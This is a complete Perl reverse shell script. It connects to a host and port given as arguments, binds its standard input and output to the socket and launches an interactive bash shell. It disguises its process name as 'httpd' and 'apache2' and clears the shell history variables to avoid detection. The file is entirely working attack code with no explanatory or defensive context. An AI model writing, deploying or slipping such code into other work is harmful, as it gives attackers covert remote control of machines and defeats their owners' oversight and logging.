#!/usr/bin/env perl

# Usage: perl reverse_shell.pl <host> <port>

use 5.010;
use strict;
use warnings;
use Socket;

sub main {
    my $host = $ARGV[0];
    my $port = $ARGV[1];

    if ($host && $port) {
        #config
        my $SHELL = '/bin/bash';			
        my $FAKE_NAME = '/usr/sbin/apache2' . "\0" x16; 
        my $HIDE = 'httpd';				

        { 
            $0 = $HIDE . "\0" x16;
            chdir('/') or warn "cannot change to dir /";
            umask(0);
        }

        my $proto = getprotobyname('tcp') or die $!;
        my $iaddr = inet_aton($host) or die $!;
        my $paddr = sockaddr_in($port, $iaddr) or die $!;

        socket(SOCK, AF_INET, SOCK_STREAM, $proto) or die $!;
        connect(SOCK,$paddr) or die "connect: $!\n";

        open STDIN, "<&SOCK";open STDOUT, ">&SOCK";open STDERR, ">&SOCK";

        $ENV{'HISTORY'} = undef if defined $ENV{'HISTORY'};
        $ENV{'HISTFILE'} = undef if defined $ENV{'HISTFILE'};
        $ENV{'HISTSIZE'} = undef if defined $ENV{'HISTSIZE'};
        $ENV{'SAVEHIST'} = undef if defined $ENV{'SAVEHIST'};
        $ENV{'HISTFILESIZE'} = undef if defined $ENV{'HISTFILESIZE'};

        exec( {$SHELL} ($FAKE_NAME, "-i") ) or warn $!; 

        close(SOCK);
    }

}

main();
exit;